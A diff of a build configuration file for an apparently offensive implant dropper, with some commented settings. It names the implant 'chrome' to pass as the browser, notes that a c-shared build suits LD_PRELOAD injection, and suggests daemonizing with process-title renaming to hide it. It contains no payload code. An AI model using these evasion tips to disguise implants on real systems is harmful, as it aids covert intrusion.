@@ -165,7 +165,7 @@ DropperName="chrome"
 
 # Implant build type: a library or binary`
 # options : exe, c-shared, default
-#DropperBuildType="c-shared"
+# C-shared is good for LD_PRELOAD
 DropperBuildType="exe"
 
 # Supported OS:
@@ -178,13 +178,17 @@ DropperOS="darwin"
 #  i386
 DropperArch="amd64"
 
-# Background and detach from console. Currently, not very elegant (no setsid(), no renaming)
+# Background and detach from console.
+# Go solution while works is not very elegant out of the box
+# You can use python deamonizer + setpoctitile to get more freedom,
+# or ZombieAntFarm fetcher.
 # Turn On: "yes"
 Daemonize="no"
 
-# Log progress messages to file (local debug)
+# Daemon: Log progress messages to file (local debug)
 # We do not want to log in production, but we want to debug to a log file locally
 LogFile="/tmp/${DropperName}.log"
 
-# Track the implant PID
+# Daemon: Track the implant PID
+# We do not want to save pid in production, but we want to do it locally
 PIDFile="/tmp/${DropperName}.pid"
